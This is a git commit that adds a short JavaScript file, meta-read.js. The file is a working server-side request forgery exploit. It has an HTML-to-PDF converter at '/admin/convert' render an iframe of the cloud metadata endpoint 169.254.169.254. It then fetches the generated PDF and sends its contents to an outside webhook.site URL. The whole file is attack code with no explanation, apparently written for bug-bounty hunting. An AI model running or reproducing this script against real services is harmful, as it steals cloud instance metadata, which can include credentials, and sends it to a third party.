34190f5a66c05d8bbac0358f45990b0d76b51549
Mayank Kumar Choubey <61092858+mr-xhunt@users.noreply.github.com>
2023-04-29 16:13:54 +0530

    Update and rename read-metaaa.js to meta-read.js

---
+++ meta-read.js
@@ -0,0 +1,36 @@
+const htmlCode = "<body><iframe src='http://169.254.169.254/latest/meta-data/'></iframe></body>";
+
+fetch('/admin/convert', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({ htmlCode: htmlCode })
+})
+.then(response => {
+  if (response.ok) {
+    return response.json();
+  }
+  throw new Error('Network response was not ok.');
+})
+.then(data => {
+  const pdfLink = data.pdfLink;
+  const encpdflink = encodeURIComponent(pdfLink);
+
+  fetch(pdfLink)
+  .then(response => response.blob())
+  .then(blob => {
+    const reader = new FileReader();
+    reader.onload = () => {
+      const pdfContent = encodeURIComponent(reader.result);
+
+      const webhookUrl = `https://webhook.site/c9b6fcf2-a309-457b-b6f2-08d9b8d42e39?data=${pdfContent}`;
+      fetch(webhookUrl)
+      .then(() => console.log('PDF content sent to webhook'))
+      .catch(error => console.error('Error sending PDF content to webhook:', error));
+    };
+    reader.readAsDataURL(blob);
+  })
+  .catch(error => console.error('Error reading PDF file:', error));
+})
+.catch(error => console.error('Error sending conversion request:', error));
